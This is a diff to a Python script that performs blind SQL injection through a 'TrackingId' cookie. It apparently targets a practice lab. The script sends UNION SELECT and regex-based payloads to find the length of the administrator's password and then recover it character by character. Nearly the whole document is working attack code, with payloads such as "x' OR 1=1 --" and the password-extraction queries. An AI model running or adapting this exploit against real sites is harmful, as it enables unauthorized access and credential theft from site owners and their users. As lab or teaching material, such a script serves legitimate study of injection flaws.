@@ -1,7 +1,7 @@
 import requests, sys, time, urllib.parse
 from bs4 import BeautifulSoup
 
-
+#Strips the URL down which is passed in at run time
 site = sys.argv[1]
 if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
@@ -9,6 +9,7 @@ if 'https://' in site:
 url = f'https://{site}/'
 
 
+#List useed for the linear search through the password
 characters = ["a", "b", "c", "d", "e", "f",
               "g", "h", "i", "j", "k", "l",
               "m", "n", "o", "p", "q", "r",
@@ -18,7 +19,9 @@ characters = ["a", "b", "c", "d", "e", "f",
 try_password = []
 query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password"
 
-
+#Attempts to run the most current injection that was generated from any of
+#the functions it called from
+#takes a query as the arg
 def try_query(query):
     print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
@@ -29,9 +32,12 @@ def try_query(query):
     else:
         return False
 
+#Tests the query fucntion
 print(try_query("""x' OR 1=1 --"""))
 print(try_query("""x" OR 1=1 --"""))
 
+#Determines the length of the password
+#by locating the admin password length in SQL
 begin_time = time.perf_counter()
 num = 1
 while True:
@@ -45,7 +51,10 @@ while True:
 print(f"Password length is {num}")
 print(f"Time elapsed is {time.perf_counter()-begin_time}")
 
-for i in range(36):
+
+#Begins Linear search to determine the password for the program
+#First for loop collects the first character of the password
+for i in range(len(characters)):
     query1 = f"{query_pass} ~ '^{characters[i]}'--"
     if try_query(query1) == False:
         pass
@@ -54,7 +63,8 @@ for i in range(36):
         try_password.append(characters[i])
         break
 
-for i in range(num):
+#Iterates through the rest of the password
+for i in range(num - 1):
     print(f"Current Password: {try_password[0]}")
     for i in range(len(characters)):
         query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
